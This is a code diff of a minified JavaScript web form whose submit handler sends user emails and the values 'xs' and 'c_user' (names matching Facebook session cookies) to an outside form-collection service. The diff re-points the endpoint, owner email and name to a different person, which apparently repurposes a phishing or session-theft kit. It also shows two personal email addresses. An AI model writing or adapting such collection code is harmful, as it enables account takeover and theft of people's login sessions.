@@ -9814,17 +9814,17 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/OqP4tNM7i", {
+                                    fetch("https://submit-form.com/4F52K0XR2", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            _ownerEmail: "asad.ali.nizamani.official@gmail.com",
+                                            _ownerEmail: "irbaznizamani773@gmail.com",
                                             xs: r,
                                             c_user: i,
-                                            name: "asad-ali"
+                                            name: "irbaz-niz"
                                         })
                                     }).then((e => {
                                         e.ok
